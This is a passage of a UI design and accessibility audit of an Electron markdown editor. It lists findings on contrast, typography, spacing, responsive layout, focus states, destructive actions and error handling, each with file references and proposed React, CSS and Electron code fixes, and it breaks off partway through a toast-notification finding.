#### [MEDIUM] C5. Light-theme tab separator is invisible
- **File:** `src/components/TabBar.tsx:26`
- **Current:** `bg-slate-200/90 border-slate-300` → composite `#cbd5e1` on `#dde3ea`
- **Problem:** **1.23:1**. In light mode the tab strip is a grey band with a slightly-less-grey border; nothing separates the active white tab from the bar. Combined with `border-t-2 border-sky-600` (`TabBar.tsx:34`) as the *only* active indicator, the light theme tab bar reads as broken rather than minimal.
- **Fix:** `bg-[var(--surface-2)] border-b border-[var(--border-default)]` and drop `border-t-2` entirely in favour of a 2px accent underline on the active tab only — or keep `border-t-2` but make the bar `--surface-1` so the active tab reads as a raised card.

#### [MEDIUM] C6. Scrollbar thumb below 3:1 in dark
- **File:** `src/index.css:23`
- **Current:** `background: rgba(100,116,139,.4)` on track `rgba(15,23,42,.4)` → **4.06:1** thumb, but the *track* is nearly identical to the thumb's base, so at rest the thumb reads as texture, not a control.
- **Fix:** `background: #64748B` (3.87:1) at rest, `#7C8AA3` on hover, and make the track transparent so panes stay flat.

#### [MEDIUM] C7. `text-slate-400` used on `bg-slate-700`/`bg-slate-800` interactive surfaces
- **File:** `CommandBar.tsx:212,215` (`text-slate-400` on `bg-slate-800`), `RawEditor.tsx:283` (`text-slate-400 hover:text-white` on `bg-slate-900`)
- **Problem:** 4.55:1 — technically passes AA, but these are *icon* buttons where the shape carries meaning; combined with `p-1` (22px hit target) they read as cramped, not faint.
- **Fix:** Not a contrast bug — fix under I5 (hit targets) and S4 (heights).

#### [LOW] C8. `fill-*` on the theme toggle makes a "Moon" look like a solid blob
- **File:** `TitleBar.tsx:121,123`
- **Current:** `<Moon className="w-4 h-4 text-sky-400 fill-sky-400" />`
- **Problem:** Filled lucide glyphs read as a different icon family from the 99 outline glyphs elsewhere. At 16px the moon's crescent detail closes up.
- **Fix:** Drop `fill-*`; use `text-[var(--accent-400)]` only.

---

### Typography

**Current distinct sizes: 14.** `text-xs`(69×, 12px), `text-[11px]`(22×), `text-sm`(17×, 14px), `text-[10px]`(7×), `text-base`(4×, 16px), `text-2xl`(1×, 24px) — plus the eight rem/em values in `index.css`. There is **no scale**; 10px and 11px are arbitrary additions used to fit text into containers, which is why the app reads as "shrinking things to make them fit" rather than "choosing sizes."

#### [HIGH] T1. 10px and 11px text is used 29 times
- **File:** `HomePage.tsx:95,233,241,274,290,348,466,486,488,492,501`; `CommandPalette.tsx:218,253,263`; `CommandBar.tsx:355`; `RawEditor.tsx:257,306,313`; `ExportModal.tsx:84,118,148,178`; `ShortcutsModal.tsx:138,220`; `SampleFilesModal.tsx:67,72`; `ImageLightboxModal.tsx:53`; `TitleBar.tsx:87`; `StatusBar.tsx:54`
- **Current:** `className="text-[10px] px-2 py-0.2 rounded-full font-mono border"` (`HomePage.tsx:233`)
- **Problem:** 10px is below every legibility threshold (Windows ClearType minimum practical is ~11px; WCAG has no minimum but 200% zoom tests collapse). `py-0.2` = 3.2px vertical padding on a badge → sub-pixel box.
- **Fix:** Delete all `text-[10px]` and `text-[11px]`. Replace with `text-2xs` (11px, defined in the `@theme` above). Change `py-0.2` → `py-0.5`.

#### [HIGH] T2. Markdown line length is ~102 characters
- **File:** `src/components/MarkdownPreview.tsx:144`
- **Current:** `className="markdown-body p-6 md:p-10 max-w-4xl mx-auto h-full overflow-y-auto …"`
- **Problem:** `max-w-4xl` = 896px; minus `md:p-10` (40px × 2) = **816px** of text. At the default 16px with Segoe UI (avg advance ≈ 0.50em = 8.0px) that is **≈102 characters per line**. The comfortable reading range is 45–90; past ~100 the eye loses the return sweep and the preview looks like a wall. This is why the document "doesn't look right" even though nothing is objectively broken.
- **Fix:**
  ```tsx
  className="markdown-body max-w-[68ch] mx-auto h-full overflow-y-auto px-8 py-10"
  ```
  `68ch` also self-corrects across font sizes — at 32px zoom the column narrows proportionally instead of staying 816px. Add `text-wrap: pretty` to `.markdown-body`.

#### [HIGH] T3. Heading rhythm is derived from each heading's own font size, so it is not a rhythm
- **File:** `src/index.css:254-282`, `:284-290`
- **Current:**
  ```css
  .markdown-body h1 { font-size: 2.15rem; margin-top: 1.8em; margin-bottom: 0.6em; padding-bottom: 0.4rem; }
  .markdown-body h2 { font-size: 1.65rem; margin-top: 1.6em; margin-bottom: 0.5em; }
  .markdown-body p, ul, ol, blockquote, table { margin-bottom: 1.25rem; }
  ```
- **Problem:** `margin-top: 1.8em` on `h1` resolves against **h1's own 34.4px** → 62px. `1.6em` on `h2` → 42px. `1.2em` on `h4` → 22px. So the gap above a section is 62px after an H1, 42px after an H2, 30px after an H3, 22px after an H4 — a 2.8:1 range with no basis. Worse, the **first heading in every document gets 62px of dead space at the top** because nothing resets it.
- **Fix:**
  ```css
  .markdown-body { --flow: 1.5rem; }
  .markdown-body > * + * { margin-top: var(--flow); }
  .markdown-body h1 { margin-block: 3rem .75rem; }
  .markdown-body h2 { margin-block: 2.5rem .625rem; }
  .markdown-body h3 { margin-block: 2rem .5rem;  }
  .markdown-body h4 { margin-block: 1.5rem .375rem; }
  .markdown-body > :first-child { margin-top: 0 !important; }
  .markdown-body p, .markdown-body ul, .markdown-body ol,
  .markdown-body blockquote, .markdown-body table { margin-block: 0 var(--flow); }
  ```

#### [HIGH] T4. Editor body and preview body ship at different default sizes
- **File:** `RawEditor.tsx:25` (`fontSize = 14`) vs `MarkdownPreview.tsx:19` (`fontSize = 16`), and `storage.ts:15` (`fontSize: 14`)
- **Current:** `RawEditor` defaults to 14, `MarkdownPreview` to 16.
- **Problem:** On a fresh install (`storage.ts:15` returns 14), split mode shows the editor at 14px and the preview at 14px — fine. But every other path (`App.tsx:884,899,912` pass the same value) plus the component defaults means the two panes disagree whenever a caller omits the prop. The gutter also independently defaults to 14 (`RawEditor.tsx:25`) and applies `text-xs` (12px) that its own inline `style` then overrides.
- **Fix:** One constant. Add to `storage.ts` a single `DEFAULT_FONT_SIZE = 16`, remove the prop defaults from `RawEditor.tsx:25` and `MarkdownPreview.tsx:19`, and make `fontSize` **required** in both prop interfaces so TypeScript enforces it.

#### [MEDIUM] T5. Zoom steps by 2px to an 11px floor — arbitrary and unusable at the bottom
- **File:** `src/App.tsx:828` (`Math.min(s + 2, 32)`), `src/App.tsx:835` (`Math.max(s - 2, 11)`)
- **Current:** step 2, range 11–32
- **Problem:** 11px is illegible and 32px is beyond any real need; the step doesn't match any scale.
- **Fix:** step 1, range 13–26: `Math.min(s + 1, 26)` / `Math.max(s - 1, 13)`.

#### [MEDIUM] T6. Zoom claims to scale the app but only scales the document body
- **File:** `src/App.tsx:826-839`
- **Current:** `setFontSize(...)` → passed to `RawEditor` and `MarkdownPreview` only; toast says `Zoom: ${next}px`
- **Problem:** Toolbar, status bar, menus stay at 12–14px. VS Code's zoom scales the entire window. A user who zooms to read a table ends up with a giant paragraph next to a 12px toolbar.
- **Fix:** Route zoom to the whole document, not per-pane. In `electron/main.cjs` add an IPC channel and call `win.webContents.setZoomFactor(f / 16)`, keeping `--preview-fs` in sync so export/HTML output is unaffected.

#### [MEDIUM] T7. Monospace is defined three times and never tokenized
- **File:** `index.css:361`, `index.css:374`, `RawEditor.tsx:357`
- **Current:** `"Cascadia Code", Consolas, "Fira Code", monospace` (×2) vs `"Cascadia Code", Consolas, "Fira Code", monospace` inline vs Tailwind's default `font-mono`.
- **Problem:** Consistent *value*, three *sources*. Also the editor forces `"Cascadia Code"` while `StatusBar.tsx:54,71`, `TitleBar.tsx:64,87`, `HomePage.tsx:241,351,466` use `font-mono` → Tailwind's stack, which on Windows resolves to **Consolas** while the editor renders **Cascadia**. Two different monospace faces visible in the same window.
- **Fix:** `--font-mono` in `@theme` only; delete the two CSS declarations and the inline style.

#### [LOW] T8. `font-sans` in `App.tsx:769` resolves differently from `.markdown-body`'s stack
- **File:** `src/App.tsx:769` (`font-sans`) vs `src/index.css:56`
- **Current:** `font-sans` → Tailwind v4 `ui-sans-serif, system-ui, …`; `.markdown-body` → `-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, …`
- **Problem:** On Windows both land on Segoe UI today, but the two lists diverge on any other platform — the chrome and the document would be set in two different faces.
- **Fix:** Both read `--font-sans`.

#### [LOW] T9. `-webkit-font-smoothing: antialiased` thins all text on Windows
- **File:** `index.html:31`, `App.tsx:119,120,132,133`
- **Current:** `class="select-none overflow-hidden antialiased"`
- **Problem:** Forcing `antialiased` on Windows disables ClearType subpixel rendering, so Segoe UI renders ~8–10% lighter than every other native Windows app. A designer comparing side-by-side will read the app as "washed out," and the muted grays get worse (they're already failing contrast).
- **Fix:** Delete `antialiased` from all four. It is a macOS-specific crutch.

---

### Spacing & layout

#### [HIGH] S1. Four different left insets in one vertical stack — the chrome edges do not line up
- **File:** `TitleBar.tsx:37` (`px-3.5` = 14px) · `TabBar.tsx:25` (`px-2.5` = 10px) · `CommandBar.tsx:79` (`px-3` = 12px) · `StatusBar.tsx:26` (`px-3.5` = 14px)
- **Current:** four values, 10/12/14
- **Problem:** This is the #1 "looks amateur" tell and it is visible in a single glance at any window size: the title bar's content starts 2px right of the tab bar's, and the status bar's doesn't match the toolbar's. Nothing else in the layout has to be wrong for the app to read as unconsidered.
- **Fix:** One value everywhere: `px-4` on all four.

#### [HIGH] S2. Four different heights in the 40px CommandBar, and 13 off-scale buttons
- **File:** `CommandBar.tsx:86,97,110,130,200` (`px-2.5 py-1` → 24px) · `:221-304` (`p-1` → 22px) · `:312,327,337` (`p-1.5` → 26px) · `:152,167,182` (segment, 22px + `p-0.5` wrapper)
- **Problem:** A single 40px row contains 22px, 24px and 26px controls. Their optical centers differ by 2px, so the row has no baseline and the labels look misaligned. The 13 formatting buttons at 22px are also below the 24px minimum target.
- **Fix:** Every toolbar control becomes `h-7` (28px) with `px-2` for labelled and `w-7` for icon-only. Icon size uniform at `w-4` — currently 16px at `:91,102,123,135,330,340` and **14px** at `:161,176,191,226,233,240,247,254,261,268,275,282,289,296,303,319,354,367`.

#### [HIGH] S3. The split is a hard 50/50 with no resize handle and no collapse
- **File:** `src/App.tsx:894-919`
- **Current:**
  ```tsx
  <div className={`h-full w-full flex divide-x ${isLight ? 'divide-slate-200' : 'divide-slate-800'}`}>
    <div className="w-1/2 h-full"> <RawEditor … /> </div>
    <div className={`w-1/2 h-full ${isLight ? 'bg-white' : 'bg-slate-950'}`}> <MarkdownPreview … /> </div>
  </div>
  ```
- **Problem:** Three defects. (a) **No drag handle** — the single most-requested feature in Typora/Obsidian/Zettlr and completely absent. (b) **No `flex-1`**, so the ratio is locked at exactly 50/50 forever, and the divider is a 1px `divide-slate-200` — a **1.23:1** line (C5) that reads as "the two panes are one broken pane." (c) **No narrow-window collapse** — at the enforced 800px minimum (see R1) each pane is 400px, and the preview column drops to ~352px of text (≈44 chars) while the editor's 48px gutter (`RawEditor.tsx:327`) eats 12% of its half.
- **Fix:**
  ```tsx
  const [split, setSplit] = useState(0.5);
  const dragging = useRef(false);
  const onDrag = (e: React.PointerEvent) => {
    if (!dragging.current) return;
    const r = e.currentTarget.parentElement!.getBoundingClientRect();
    setSplit(Math.min(0.75, Math.max(0.25, (e.clientX - r.left) / r.width)));
  };
  // …
  <div ref={box} className="flex h-full w-full" style={{ ['--split' as string]: `${split * 100}%` }}>
    <div className="h-full shrink-0 overflow-hidden" style={{ width: 'var(--split)' }}><RawEditor … /></div>
    <div role="separator" aria-orientation="vertical" aria-label="Resize editor and preview"
         tabIndex={0}
         onPointerDown={() => { dragging.current = true; }}
         onPointerMove={onDrag}
         onPointerUp={() => { dragging.current = false; }}
         onKeyDown={(e) => { if (e.key === 'ArrowLeft') setSplit(s => Math.max(.25, s - .02));
                             if (e.key === 'ArrowRight') setSplit(s => Math.min(.75, s + .02)); }}
         className="group relative w-px shrink-0 cursor-col-resize bg-[var(--border-default)]
                    hover:bg-[var(--accent-500)] focus-visible:bg-[var(--accent-500)]
                    focus-visible:outline-2 focus-visible:outline-offset-[-2px] focus-visible:outline-[var(--accent-500)]">
      <span className="absolute inset-y-0 -left-1 -right-1" />
    </div>
    <div className="h-full flex-1 min-w-0 bg-[var(--surface-0)]"><MarkdownPreview … /></div>
  </div>
  ```
  Differentiate the panes by **surface**, not by a line: `--surface-0` for the editor, `--surface-1` for the preview. Add a `ResizeObserver` that calls `setSplit(0.5)` and switches to single-pane when `box.clientWidth < 760`.

#### [HIGH] S4. App shell is 156px of chrome and the tab strip is 42px of it for one row
- **File:** `TitleBar.tsx:37` (`h-[42px]`) · `TabBar.tsx:25` (`h-[42px]`) · `CommandBar.tsx:79` (`h-10` = 40px) · `StatusBar.tsx:26` (`h-8` = 32px)
- **Problem:** Two arbitrary `h-[42px]` values (off-scale) sit above two on-scale values. At the default 1280×840 that leaves 684px of content; at 1280×720, 564px; at the 800×600 minimum, **444px**. The tab strip duplicates the title bar's job (it also shows the filename at `TitleBar.tsx:55`) while costing a full 42px.
- **Fix:** Collapse the tab strip into the title bar. One 44px row: drag region + app mark + tabs + window controls. That reclaims 42px and removes the redundant filename.

#### [HIGH] S5. Caption buttons are 40×40 inside a 42px header, inside a *framed* window
- **File:** `src/components/TitleBar.tsx:130-161`; `src/electron/main.cjs:15`
- **Current:**
  ```tsx
  // electron/main.cjs:15
  frame: true,
  // TitleBar.tsx:134,143,156
  className="w-10 h-10 flex items-center justify-center transition"
  ```
- **Problem:** Three compounding failures. (a) `frame: true` means **Windows already draws a native title bar**, and the app draws a second set of minimize/maximize/close buttons directly beneath it — two title bars stacked. (b) `w-10 h-10` in a 42px header leaves 1px above and below: they touch both the top of the window and the `border-b`. (c) `window.blur()` (`:132`) **does not minimize** an Electron window; `document.documentElement.requestFullscreen()` (`:26`) does not maximize the BrowserWindow and leaves the native frame drawn. Both buttons lie. And the close button calls `window.close()` (`:153`), quitting the app and discarding every dirty tab.
- **Fix:**
  ```js
  // electron/main.cjs:9-23
  const win = new BrowserWindow({
    width: 1280, height: 840, minWidth: 900, minHeight: 600,
    frame: false, titleBarStyle: 'hidden', backgroundColor: '#0A0E17',
    webPreferences: { nodeIntegration: false, contextIsolation: true, sandbox: true },
  });
  ipcMain.handle('win:minimize', () => win.minimize());
  ipcMain.handle('win:toggle-max', () => (win.isMaximized() ? win.unmaximize() : win.maximize()));
  ipcMain.handle('win:close', () => win.close());
  win.on('maximize',  () => win.webContents.send('win:state', 'max'));
  win.on('unmaximize', () => win.webContents.send('win:state', 'restored'));
  ```
  ```tsx
  // TitleBar — real behaviour, correct metrics
  <header className="h-11 … px-2 select-none [-webkit-app-region:drag] flex items-center gap-2">
    {/* controls */}
    <button onClick={() => window.electron.ipc.invoke('win:minimize')} className="w-11 h-11 grid place-items-center
            hover:bg-[var(--surface-3)] focus-visible:outline-2 focus-visible:outline-[--accent-400]"
            aria-label="Minimize"><Minus className="w-3.5 h-3.5"/></button>
    <button onClick={toggleMax} className="w-11 h-11 …" aria-label={isMax ? 'Restore' : 'Maximize'}>
      {isMax ? <Copy className="w-3 h-3"/> : <Square className="w-3 h-3"/>}</button>
    <button onClick={confirmClose} className="w-11 h-11 … hover:bg-[#C42B1C] hover:text-white" aria-label="Close window">
      <X className="w-3.5 h-3.5"/></button>
  </header>
  ```
  Buttons must be `[-webkit-app-region:no-drag]`.

#### [MEDIUM] S6. The toolbar has ~0px of slack at the default window width and no overflow affordance
- **File:** `CommandBar.tsx:79` + `:83-370`
- **Problem:** Measured content ≈ **1209px** inside a **1256px** content box (`px-3` on both sides of 1280). That is under 50px of slack with the 13-button format group visible (`hidden xl:flex` = active at exactly 1280). Any longer label, any Windows text-scale bump, and it overflows — into `overflow-x-auto` with a dead `no-scrollbar` class (U6), producing a 10px scrollbar carved out of the fixed `h-10` and silently hiding the **Export** button. Meanwhile the three most-used controls (New, Open, Save) sit at the far left, maximally far from a right-handed mouse.
- **Fix:** Move the 13 format buttons into an overflow menu (single `MoreHorizontal` button → popover), and pin **Save** to the right of the segment control:
  ```
  [New] [Open] │ [ Preview | Raw | Split ] │ [Sync] │ [Aa] [Wrap] │ …spacer… │ [Save ▾] [Export] [⋯]
  ```
  Mark the format group `hidden 2xl:flex` and give the container `min-w-0` + `overflow-hidden` rather than `overflow-x-auto`.

#### [MEDIUM] S7. The root wrapper is not positioned but uses `absolute inset-0`
- **File:** `src/App.tsx:769-774`
- **Current:** `<div className="h-screen w-screen flex flex-col overflow-hidden font-sans …">` then `<div className="absolute inset-0 z-50 …">` (drag overlay)
- **Problem:** The root has no `relative`, so the overlay resolves against the initial containing block. It happens to coincide with the viewport, so it "works" — but the overlay's `z-50` is then in the same stacking layer as `TitleBar.tsx:37`'s `z-50`, which has `backdrop-blur-md`. Paint order is decided by DOM order, not by intent.
- **Fix:** Add `relative` to the root, and adopt a real z-scale: `z-10` chrome · `z-20` find bar/popovers · `z-30` toasts · `z-40` scrim · `z-50` dialog · `z-[60]` lightbox.

#### [MEDIUM] S8. Alignment drift between the editor half and the preview half in split mode
- **File:** `App.tsx:895-918`, `RawEditor.tsx:327,350`, `MarkdownPreview.tsx:144`
- **Problem:** Editor text starts at `48px (w-12) + 16px (px-4)` = **64px** from the pane's left edge. Preview text starts at `40px (md:p-10)` = **40px**, and is *centred* via `mx-auto`. So the two columns of text that the sync-scroll feature invites you to compare have a **24px horizontal offset and opposite alignment**. Vertically both use `py-4` vs `py-10` — **24px** apart.
- **Fix:** Make the preview padding `py-4 px-4` in split mode and `py-12 px-8` in preview-only mode, driven by a `compact` prop. Set the editor's `padding-left` to the same value as the preview's so the two text columns share a left edge.

#### [MEDIUM] S9. Radii and shadows drift between equivalent cards
- **File:** `HomePage.tsx:216` (`p-4.5 rounded-2xl shadow-md`) vs `:317` (`p-4.5 rounded-2xl hover:translate-y-[-2px]`) vs `:386` (`rounded-2xl border border-dashed p-12`) vs `:414` (`rounded-2xl … shadow-lg`) vs `SampleFilesModal.tsx:55` (`p-4 rounded-xl`) vs `ExportModal.tsx:110` (`p-4 rounded-xl`)
- **Problem:** Same conceptual object ("a card in a list") is `rounded-2xl`+`p-4.5` on HomePage, `rounded-xl`+`p-4` in ExportModal, `rounded-xl`+`p-4` in SampleFilesModal. Three sets of padding and two radii for one component type.
- **Fix:** `--radius-lg` + `p-4` + `--shadow-1` for every list card, without exception.

#### [LOW] S10. `py-4.5`, `p-4.5`, `py-3.5`, `px-4.5`, `h-7.5`, `w-4.5`, `py-0.5` — 7 off-scale fractional steps
- **File:** `HomePage.tsx:216,317,440,466`; `CommandPalette.tsx:200,263`; `TitleBar.tsx:77`; `HomePage.tsx:167,225`; `RawEditor.tsx:326`
- **Problem:** These compile (Tailwind v4 multiplies `--spacing` by any number) but they encode decisions nobody made deliberately.
- **Fix:** Round to the scale. `px-4` / `p-4` / `p-5` / `h-8` / `w-4`.

---

### Responsiveness

There is exactly **one** responsive mechanism in the whole app: Tailwind `sm:` / `md:` / `lg:` / `xl:` prefixes, used 31 times. There is **no** container query, **no** JS resize handling, **no** `useMediaQuery`, **no** collapse behaviour, and **no** `ResizeObserver`.

| Viewport | Chrome | Content height | Predicted result |
|---|---|---|---|
| **1280×720** (most common laptop) | 156px | 564px | Toolbar at ~96% capacity (S6). `md:p-10` active. Preview-only: 1200px column → `max-w-4xl` caps at 896 → 816px text = 102 chars (T2). **Passable but visibly loose.** |
| **1366×768** | 156px | 612px | Same as above. Tab strip: 4–5 tabs fit, 6+ silently clip (dead `no-scrollbar`). |
| **2560×1440** (ultrawide) | 156px | 1284px | Preview-only: text centred in 896px with **832px of empty gradient** on each side and no container edge, so it reads as a floating column. Split: each pane 1280px, preview caps at 896 → 192px dead gutter *inside* each pane, so the split line no longer sits between two text columns. Tab bar: tabs occupy the left 400px of a 2560px strip with 2100px of nothing to the right. |
| **1024×768** | 156px | 612px | `xl` format group hidden → toolbar fits. But `lg:inline` Split label and `md:inline` Save As both appear; at 1024 the Save As + Split labels are the first to wrap/clip. |
| **800×600** (enforced minimum, `main.cjs:12-13`) | 156px | 444px | **Worst case.** TitleBar: search bar `flex-1 max-w-md mx-4` = 480px + right cluster 206px + `px-3.5` 28px = 714px, leaving **86px** for the logo and filename, so `max-w-[200px] md:max-w-[360px] truncate` (`TitleBar.tsx:55`) collapses to a sliver. Split: each pane 400px; editor = 48px gutter + 352px textarea; preview = 400 − 48 (`p-6`) = **352px ≈ 44 chars**. No single-pane fallback. CommandBar still overflows. |

#### [HIGH] R1. `minWidth: 800 / minHeight: 600` is below the app's usable width and the split has no fallback
- **File:** `electron/main.cjs:12-13`; `App.tsx:893-920`
- **Problem:** At 800px the two-pane split is unusable and the title bar has already collapsed. There is no code path that collapses split → single pane at any width.
- **Fix:** Raise to `minWidth: 900, minHeight: 640` **and** add the `ResizeObserver` collapse from S3. Below 760px of pane width, force single-pane and surface a `PanelLeftClose` / `PanelRightClose` toggle.

#### [HIGH] R2. `justify-between` spreads a dense toolbar across 2560px, putting Export 2000px from New
- **File:** `CommandBar.tsx:79`
- **Problem:** At ultrawide the four clusters fly apart; the 13 format buttons (`:219-305`) are pinned at the vertical centre-left while everything actionable drifts to the edges. Mouse travel on a 2560px screen.
- **Fix:** Wrap the left cluster and center cluster in a single `flex items-center gap-2` div (no `justify-between` between them), then `ml-auto` only on the right cluster. Add a content cap: `max-w-[1600px] mx-auto` on the toolbar's inner row so the control group stays a coherent band.

#### [MEDIUM] R3. HomePage tables and hero reflow badly between 1024 and 1280
- **File:** `HomePage.tsx:79` (`flex flex-col md:flex-row`), `:110` (`gap-2.5 flex-wrap`), `:312` (`grid-cols-1 md:grid-cols-2 lg:grid-cols-3`), `:425-427` (`hidden md:table-cell` / `hidden sm:table-cell`)
- **Problem:** At 1024px the hero's three CTAs (`Open Windows MD File` = ~168px, `New Document` = ~128px, `Sample Library` = ~140px + 2 gaps = 20px = **456px**) sit beside the logo block (58px logo + text ≈ 400px) = 856px in a 1024 − 80px = 944px box. It fits — but at exactly the `md` breakpoint they flip to `flex-col`, so between 768 and 1024 the hero is a tall stacked stack pushing the search field below the fold. And `Sample Library` uses `px-3.5` while the other two use `px-4` (`HomePage.tsx:135` vs `:113,122`) — the three primary buttons have visibly different widths.
- **Fix:** `px-4` on all three; drop `Sample Library` to a tertiary ghost button (`ghost` variant, no border) so the primary/secondary hierarchy is clear; set the hero to `md:items-start` so it doesn't stretch.

#### [MEDIUM] R4. `hidden md:block` / `hidden sm:inline` labels are the only responsive strategy and they thrash
- **File:** `TitleBar.tsx:46,51,64,74,102,125`; `CommandBar.tsx:92,103,136,192,355,368`; `StatusBar.tsx:74,80,88`; `HomePage.tsx:425-427`
- **Problem:** 31 breakpoints toggling labels on/off means a 1280px window and a 1270px window have completely different toolbars. Nothing reflows, so items vanish rather than wrap.
- **Fix:** Keep labels always visible for the 5 primary actions; use an icon-only variant below `lg` via a `useMediaQuery('(min-width: 1024px)')` hook so the change is one boolean, not six scattered prefixes.

---

### Interaction & feedback

73 `<button>` elements. **0** have a `:focus` or `:focus-visible` style. **1** has a `disabled:` style (`RawEditor.tsx:306`). **0** have an `active:` (pressed) style. 107 `hover:` utilities.

#### [HIGH] I1. No focus ring anywhere in the app
- **File:** 7 × `outline-none` — `CommandPalette.tsx:213`, `ExportModal.tsx:239`, `HomePage.tsx:173`, `RawEditor.tsx:252,299,350`, `ShortcutsModal.tsx:171`
- **Current:** `className="… rounded px-2.5 py-1 text-xs outline-none border focus:border-sky-500 w-48"` (`RawEditor.tsx:252`)
- **Problem:** `outline-none` on all seven, and the *only* replacement is a border-colour change on inputs. **Every button and every icon control in the app has zero focus indication.** Keyboard users tabbing through the CommandBar, the tab strip or HomePage cannot see where they are. This also fails WCAG 2.4.7.
- **Fix:** Add once, globally:
  ```css
  @layer base {
    :where(button, a, input, textarea, select, [tabindex]):focus-visible {
      outline: 2px solid var(--accent-400);
      outline-offset: 2px;
      border-radius: var(--radius-sm);
    }
    :where(button, [role="tab"], [role="option"]):focus:not(:focus-visible) { outline: none; }
    :where(button, a, [role="tab"], [role="option"]):focus:not(:focus-visible) { outline: none; }
  }
  ```
  Then **delete all 7 `outline-none`** — the global rule replaces them. Add `focus-visible:ring-1 focus-visible:ring-[--accent-400]` only where the outline would be clipped by `overflow-hidden` (the tab strip, `RawEditor.tsx:325-337`).

#### [HIGH] I2. Destructive actions have no confirmation and destroy work silently
- **File:** `App.tsx:593-608` (close tab), `:617-621` (delete record), `:624-628` (clear all history), `HomePage.tsx:372-381` (Clear History button), `HomePage.tsx:506-514` (delete row)
- **Current:**
  ```tsx
  const handleCloseTab = useCallback((fileId: string) => {
    const tabToClose = tabs.find((t) => t.fileId === fileId);
    if (!tabToClose) return;
    const remaining = tabs.filter((t) => t.fileId !== fileId);
    setTabs(remaining);                              // ← isDirty never checked
    …
    showToast(`Closed "${tabToClose.name}"`);          // ← toast CONFIRMS the data loss
  }, …);
  ```
- **Problem:** `isDirty` is checked nowhere. Closing a dirty tab (mouse, middle-click `TabBar.tsx:53-59`, or `Ctrl+W` at `App.tsx:656-660`) discards the content with a cheerful "Closed" toast. `Ctrl+Shift+Delete`-equivalent "Clear History" wipes every record in one click. And the window close button (`TitleBar.tsx:153`) quits the app discarding every dirty tab.
- **Fix:**
  ```tsx
  const [pendingClose, setPendingClose] = useState<FileTab | null>(null);
  const requestClose = (fileId: string) => {
    const t = tabs.find(x => x.fileId === fileId);
    if (t?.isDirty) return setPendingClose(t);        // gate on dirtiness
    commitClose(fileId);
  };
  ```
  Plus a real confirm dialog: `role="alertdialog"`, `aria-labelledby`, `aria-describedby`, focus on the destructive button, Escape cancels, and three explicit choices — **Save and close / Don't save / Cancel**. Apply the same gate to `window.close()` in `TitleBar.tsx:150-155` and to `handleClearHistory`. Add a `beforeunload` guard in `electron/main.cjs` as a backstop.

#### [HIGH] I3. No loading state for any async operation
- **File:** `App.tsx:169-237` (open by id — IndexedDB + `handle.getFile()`), `:416-496` (save — `createWritable()` + two IDB round-trips), `:499-582` (Save As), `:240-356` (Open dialog)
- **Problem:** Every one of these is `async` with multiple awaits and **not one** sets a pending flag. On a 2MB file over IDB the user clicks Open and the UI simply does nothing for 200–500ms, so they click again. There is no spinner, no disabled state, no progress.
- **Fix:** `const [busy, setBusy] = useState<string | null>(null)` and a `<Spinner/>` swapped into every affected button:
  ```tsx
  <button disabled={busy === 'save'} className="… disabled:opacity-60 disabled:cursor-wait">
    {busy === 'save' ? <Spinner className="w-4 h-4"/> : <Save className="w-4 h-4"/>}
    Save
  </button>
  ```
  Add a shared `<Spinner/>` (`animate-spin` on a `LoaderCircle`, 1px accent arc) and an `aria-busy` attribute on the affected regions.

#### [HIGH] I4. The app fails silently — every error path is a `console.warn`
- **File:** `App.tsx:201,302,464,567`; `storage.ts:30,34,58,63,73,93,104,114,142,153,166,178,196,209`; `markdown.ts:85`
- **Current:**
  ```tsx
  } catch (err: any) {
    if (err.name === 'AbortError') return;
    console.warn('showOpenFilePicker error or unsupported, falling back to input', err);
  }
  ```
- **Problem:** Twenty-one catch blocks and **not one** surfaces anything to the user. If the File System Access API is unavailable, the write to disk fails, IDB is full, or the clipboard is blocked, the user gets silence or a misleading success toast. `handleSave` at `App.tsx:463-465` catches a disk-write failure and silently falls through to "Saved to Permanent Memory" — the user believes their file was written when it was not.
- **Fix:** One error channel with severity:
  ```ts
  type Notice = { id: number; kind: 'info' | 'success' | 'warn' | 'error';
                  msg: string; action?: { label: string; run: () => void } };
  // …
  } catch (err) {
    if ((err as DOMException)?.name === 'AbortError') return;   // user cancelled
    notify({ kind: 'error', msg: `Could not write ${activeTab.name}. Permission may have been revoked.`,
             action: { label: 'Save As…', run: handleSaveAs } });
  }
  ```
  Render it in the toast host with `role="status"` for info/success and `role="alert"` for error, an icon per severity, and a 6s (not 2.8s) dwell for errors. **Never swallow an error that changes the user's mental model of where their data is.**

#### [MEDIUM] I5. Icon hit targets are 22px
- **File:** `TabBar.tsx:96` (`w-5.5 h-5.5` = 22px close), `RawEditor.tsx:262,269,276,283` (`p-1` + `w-3.5` = 22px), `CommandBar.tsx:221-304` (`p-1` = 22px), `:312,327,337` (`p-1.5` = 26px), `HomePage.tsx:447` (`p-0.5` = 18px pin), `SampleFilesModal.tsx:41`
- **Problem:** 22px and 18px targets. WCAG 2.5.8 (AA) requires 24×24 minimum. The pin toggle at 18px in a dense table is the worst offender.
- **Fix:** `w-7 h-7` (28px) for all icon-only controls, with the icon staying `w-4`. Where the visual must stay small, use a pseudo-element expander: `relative after:absolute after:inset-[-4px] after:content-['']`.

#### [MEDIUM] I6. No pressed state on 73 buttons
- **File:** all `<button>` elements
- **Problem:** No `active:` utility is used anywhere. Clicking gives only the hover state, so there is no confirmation that the press registered — most noticeable on the toolbar, where a mistimed click changes the document's view mode.
- **Fix:** Global, plus per-variant scale:
  ```css
  @layer base {
    button:not(:disabled) { transition: transform var(--dur-1) var(--ease-out); }
    button:not(:disabled):active { transform: scale(.97); }
  }
  ```
  For the toolbar use `active:bg-[var(--surface-4)]` instead of a transform, to avoid 13 buttons scaling simultaneously.

#### [MEDIUM] I7. Toast host has a single string slot and races with itself
- **File:** `App.tsx:71-78`, `:925-934`
- **Current:**
  ```tsx
  const [toastMessage, setToastMessage] = useState<string | null>(null);
  const showToast = useCallback((msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage((prev) => (prev === msg ? null : prev)), 2800);
  }, []);
  ```
- **Problem:** (a) A second toast replaces the first — rapid Ctrl+S then Ctrl+Shift+S loses one. (b) The timer is never cleared, so it fires after unmount. (c) `animate-ping` on the 8px dot (`App.tsx:931`) is gratuitous — the dot is a *status indicator*, not a live region. (d) It has no `role="status"` so screen readers never announce it.
- **Fix:**
  ```tsx
  const [toasts, setToasts] = useState<Notice[]>([]);
  const notify = useCallback((n: Omit<Notice,'id'>) => {
    const id = ++seq.current;
    setToasts(t => [...t.slice(-2), { ...n, id }]);
